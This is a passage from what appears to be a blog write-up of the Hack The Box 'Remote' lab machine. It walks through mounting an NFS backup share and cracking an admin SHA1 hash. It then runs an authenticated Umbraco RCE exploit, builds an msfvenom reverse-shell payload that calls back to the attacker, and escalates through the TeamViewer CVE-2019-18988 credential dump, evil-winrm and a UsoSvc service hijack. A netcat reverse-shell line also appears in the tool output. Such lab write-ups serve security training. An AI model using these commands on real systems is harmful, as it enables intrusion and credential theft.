$ showmount -e <span style="color:#e6db74">&#39;10.10.10.180&#39;</span>
Export list <span style="color:#66d9ef">for</span> 10.10.10.180:
/site_backups
</code></pre></div><p>I can mount the share to my Kali because it is accessible to everyone.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ mount -t nfs 10.10.10.180:/site_backups /mnt/iamf
</code></pre></div><p><img src="https://miro.medium.com/max/943/1*L5gt8QgAvhpN0jSNRxrN6g.png" alt="img" style="zoom:80%;" /></p>
<p>When I ran the <code>find</code> command on the mounted NFS, I discovered two interesting files: <code>embraco.config</code> and umbraco.sdf.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «iamf» «10.10.14.3»
$ find . -type f 2&gt;/dev/null

...&lt;snip&gt;...
./App_Data/TEMP/PluginCache/umbraco-plugins.INTRANET.list
./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.hash
./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.list
./App_Data/umbraco.config
./App_Data/Umbraco.sdf
./App_Plugins/ModelsBuilder/modelsbuilder.controller.js
./App_Plugins/ModelsBuilder/modelsbuilder.htm
./App_Plugins/ModelsBuilder/modelsbuilder.resource.js
...&lt;snip&gt;...
</code></pre></div><p><code>umbraco.config</code> is a config file formatted in xml and <code>umbraco.sdf</code> is a database file.</p>
<center>
<img src="imgs/image-20210406054737539.png" alt="image-20210406054737539" style="zoom:80%;" />
<p><img src="https://miro.medium.com/max/786/1*4tt979oRubnll3RguRAQDA.png" alt="img" style="zoom:80%;" /></p>
</center>
<p>The config file doesn&rsquo;t store credentials.</p>
<p>Since the database file is a binary, the <code>strings</code> and <code>grep</code> command can be used to display some readable strings such as &ldquo;admin&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ strings App_Data/umbraco.sdf | grep -i admin

...&lt;snip&gt;...
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span>“hashAlgorithm”:”SHA1<span style="color:#e6db74">&#34;}en-USf8512f97-cab1–4a4b-a49f-0a2054c47a1d
</span><span style="color:#e6db74">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span>“hashAlgorithm”:”SHA1<span style="color:#e6db74">&#34;}admin@htb.localen-US82756c26–4321–4d27-b429–1b5c7c4f882f
</span><span style="color:#e6db74">User “admin” &lt;admin@htb.local&gt;192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
</span><span style="color:#e6db74">User “admin” &lt;admin@htb.local&gt;192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success
</span><span style="color:#e6db74">User “SYSTEM” 192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, 
</span><span style="color:#e6db74">...&lt;snip&gt;...
</span></code></pre></div><p>From the output above, I can only guess this is the correct pair of username and password. <code>admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa</code></p>
<p>The password that was identified as SHA1 can be cracked online with crackstation. The password is <code>bacondandcheese</code></p>
<p><img src="imgs/image-20210406055746058.png" alt="image-20210406055746058" style="zoom:80%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-apppool">Shell as IIS apppool</h3>
<h4 id="access-on-umbraco-cms">Access on Umbraco CMS</h4>
<p>The credential can be used on Umbraco CMS.</p>
<p><img src="https://miro.medium.com/max/1635/1*PMsbzYlHMk5adNFVMz2Oeg.png" alt="img" style="zoom:80%;" /></p>
<p>I can see the CMS version by accessing the menu on the left side. A quick search on Google reveals the current version is vulnerable to RCE.</p>
<blockquote>
<p><a href="https://www.exploit-db.com/exploits/46153">Offensive Security&rsquo;s Exploit Database ArchiveUmbraco CMS 7.12.4 - (Authenticated) Remote Code Execution.. webapps exploit for ASPX platformwww.exploit-db.com</a></p>
</blockquote>
<p>I copied the exploit and ran it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Umbraco-RCE» «10.10.14.3»
$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a ‘ls c:/’
</code></pre></div><p><img src="imgs/image-20210406060557239.png" alt="image-20210406060557239" style="zoom:80%;" /></p>
<h4 id="persistent-shell---meterpreter">Persistent Shell - Meterpreter</h4>
<p>I can upgrade the RCE to a persistent shell by sending a PowerShell one liner payload or use <code>msfvenom</code> to craft a payload.</p>
<blockquote>
<p>I don&rsquo;t remember correctly, but I think I messed up with the one liner, so I go with <code>msfvenom</code>.</p>
</blockquote>
<p>Upload features from Umbraco didn&rsquo;t restrict <code>.exe</code> file. It is located on <code>/media</code> and the directory of the uploaded file is located on <code>C:/inetpub/wwwroot/media/[itemID]/payload.exe</code></p>
<p><img src="imgs/image-20210406062610944.png" alt="image-20210406062610944" style="zoom:80%;" /></p>
<p>I&rsquo;ll create a executable reverse shell and upload it to Umbraco <code>/media</code> page and have listener using <code>Metasploit</code> listening on the specified port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -a x86 -f exe &gt; fremote.exe
</code></pre></div><p>Then I&rsquo;ll just execute my payload on <code>C:/inetpub/wwwroot/media/1136/fremote.exe</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a ‘C:/inetpub/wwwroot/media/1136/fremote.exe’
</code></pre></div><p><img src="imgs/image-20210406063758369.png" alt="image-20210406063758369" style="zoom:80%;" /></p>
<p>I can spawn PowerShell by typing</p>
<pre><code>execute -f powershell.exe
</code></pre><center>
<img src="imgs/image-20210406063911685.png" alt="image-20210406063911685" style="zoom:80%;" />
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as--administrator">Shell as  Administrator</h3>
<p>For the last part, I have two options to gain administrator or system access: TeamViewer7 CVE-2019-18988 and hijacking <code>UsoSvc</code> . For <code>UsoSvc</code>, I&rsquo;m still unsure if it came from the box or was caused by other players, but I&rsquo;ll show both.</p>
<h4 id="teamviewer7-cve-2019-18988">TeamViewer7 CVE-2019-18988</h4>
<p><code>WinPEAS</code> shows there&rsquo;s TeamViewer7 service currently running. This version is vulnerable to CVE-2019-18988</p>
<p>From <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18988:">https://nvd.nist.gov/vuln/detail/CVE-2019-18988:</a></p>
<blockquote>
<p>It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the  current version of the product</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">========================================(Services Information)========================================
... &lt;snip&gt; ... 
    TeamViewer7(TeamViewer GmbH - TeamViewer 7)[&#34;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe&#34;] - Auto - Running
    TeamViewer Remote Software
   =================================================================================================                
    
    UsoSvc(Update Orchestrator Service)[cmd \c C:\Users\nc.exe 10.10.14.8 4444 -e cmd.exe] - Auto - Stopped - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess, Start
    Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates.
   =================================================================================================   
... &lt;snip&gt; ... 
</code></pre></div><p>Because <code>metasploit</code> has a post module for that CVE, so I could simply the background current session and run the post module.</p>
<pre><code>meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords
</code></pre><p><img class="img-container" src="imgs/image-20210406070901576.png" alt="image-20210406070901576"  />
</p>
<h4 id="remote-access---evil-winrm">Remote Access - Evil-WinRM</h4>
<p>The password itself is reused by the administrator account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ evil-winrm -u administrator -p <span style="color:#e6db74">&#39;!R3m0te!&#39;</span> -i htb.remote
</code></pre></div><center>
<p><img class="img-container" src="imgs/image-20210406070830154.png" alt="image-20210406070830154"  />
</p>
</center>
<h4 id="alternative-unquoted-service-path---usosvc">(Alternative) Unquoted Service Path - UsoSvc</h4>
<p>If this unquoted service path was originally from the box, I could just modify the <code>UsoSvc</code> executable path to point to my previous uploaded payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; sc.exe config usosvc binPath=<span style="color:#e6db74">&#34;C:/inetpub/wwwroot/media/1136/fremote.exe&#34;</span>
</code></pre></div><p>I&rsquo;ll set <code>netcat</code> listener on port 4444</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ nc -nvlp <span style="color:#ae81ff">4444</span>
</code></pre></div><p>Now on Remote, I can just start the service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; sc.exe start usosvc
</code></pre></div><p>I don&rsquo;t have any screenshots, but that should work.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/pentesting/nfs-service-pentesting</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
